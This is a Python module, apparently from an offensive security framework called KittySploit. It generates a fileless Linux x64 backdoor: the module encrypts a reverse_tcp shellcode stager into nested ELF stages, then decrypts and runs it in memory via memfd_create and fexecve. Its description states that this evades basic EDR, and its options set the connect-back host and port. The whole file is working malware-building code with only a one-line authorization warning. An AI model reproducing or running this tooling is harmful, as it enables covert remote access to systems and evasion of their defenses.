#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
memfd_create + fexecve fileless Linux loader.

Builds an encrypted inner ELF loader, wraps it in an outer stub that decrypts
to an anonymous memfd and execs via fexecve — no on-disk payload artifact.
"""

from pathlib import Path

from kittysploit import *
from lib.compile.backdoor_helpers import generate_payload_bytes, option_value, report_payload_size
from lib.compile.elf_shellcode_loader import ElfShellcodeLoaderBuilder
from lib.compile.linux_backdoor_helpers import compile_c_elf
from lib.compile.memfd_exec import MemfdExecBuilder


class Module(Backdoor):
    __info__ = {
        "name": "Linux memfd_exec Evasion",
        "description": (
            "Generate a Linux x64 ELF that decrypts a staged loader into memfd_create "
            "and executes it with fexecve — fileless delivery effective against basic EDR."
        ),
        "author": "KittySploit",
        "platform": Platform.LINUX,
        "arch": Arch.X64,
        "references": [
            "https://attack.mitre.org/techniques/T1027.011/",
        ],
    }

    payload_path = OptString(
        "payloads/stagers/linux/x64/reverse_tcp",
        "Payload module path (raw shellcode)",
        True,
    )
    lhost = OptString("127.0.0.1", "Connect-back IP address (reverse payloads)", True)
    lport = OptPort(4444, "Connect-back TCP port (reverse payloads)", True)
    encoder = OptString("", "Encoder module path (optional)", False)
    cipher = OptChoice("rc4", "Encryption type for inner and outer stage", True, ["rc4", "chacha"])
    memfd_name = OptString("ksvc", "memfd_create label (shown in /proc/self/fd)", False)
    output_name = OptString("memfd_exec_evasion", "Output ELF filename", False)
    optimization = OptChoice(
        "ReleaseSmall",
        "Zig optimization level",
        False,
        ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )
    save_source = OptBool(False, "Save generated C source alongside the ELF", False, advanced=True)

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def run(self):
        raw_payload = generate_payload_bytes(self)
        if not raw_payload:
            return False
        report_payload_size(raw_payload)

        cipher = str(option_value(self, "cipher") or "chacha").lower()
        optimization = str(option_value(self, "optimization") or "ReleaseSmall")

        inner_builder = ElfShellcodeLoaderBuilder(cipher=cipher, sleep_ms=0)
        inner_enc, inner_key, inner_iv = inner_builder.encrypt_payload(raw_payload)
        inner_source = inner_builder.build_source(inner_enc, inner_key, inner_iv)

        from lib.compile.linux_backdoor_helpers import compile_elf_bytes

        inner_elf = compile_elf_bytes(
            source=inner_source,
            framework=getattr(self, "framework", None),
            optimization=optimization,
        )
        if not inner_elf:
            print_error("Failed to compile inner ELF stage for memfd_exec.")
            return False

        outer_builder = MemfdExecBuilder(cipher=cipher, sleep_ms=0)
        outer_enc, outer_key, outer_iv = outer_builder.encrypt_payload(inner_elf)
        outer_source = outer_builder.build_source(
            outer_enc,
            outer_key,
            outer_iv,
            memfd_name=str(option_value(self, "memfd_name") or "ksvc"),
        )

        out_dir = Path(self.output_dir_path("backdoors/linux/evasion"))
        out_dir.mkdir(parents=True, exist_ok=True)
        bin_name = str(option_value(self, "output_name") or "memfd_exec_evasion").strip()
        elf_path = out_dir / bin_name

        if option_value(self, "save_source"):
            (out_dir / "memfd_exec_evasion.c").write_text(outer_source, encoding="utf-8")
            print_success(f"C source saved: {out_dir / 'memfd_exec_evasion.c'}")

        ok = compile_c_elf(
            source=outer_source,
            elf_path=elf_path,
            framework=getattr(self, "framework", None),
            optimization=optimization,
        )

        if ok and elf_path.is_file():
            lhost = str(option_value(self, "lhost") or "127.0.0.1")
            lport = int(option_value(self, "lport") or 4444)
            print_success(f"Backdoor ELF generated: {elf_path} ({elf_path.stat().st_size} bytes)")
            print_info(f"Inner stage: {len(inner_elf)} bytes | memfd label: {option_value(self, 'memfd_name')}")
            print_info(f"Embedded callback: {lhost}:{lport} (must match a running reverse_tcp listener)")
            print_warning("Use only on authorized systems. Start a matching listener before running the binary.")
            return True

        print_error("ELF compilation failed. Ensure Zig is installed.")
        return False
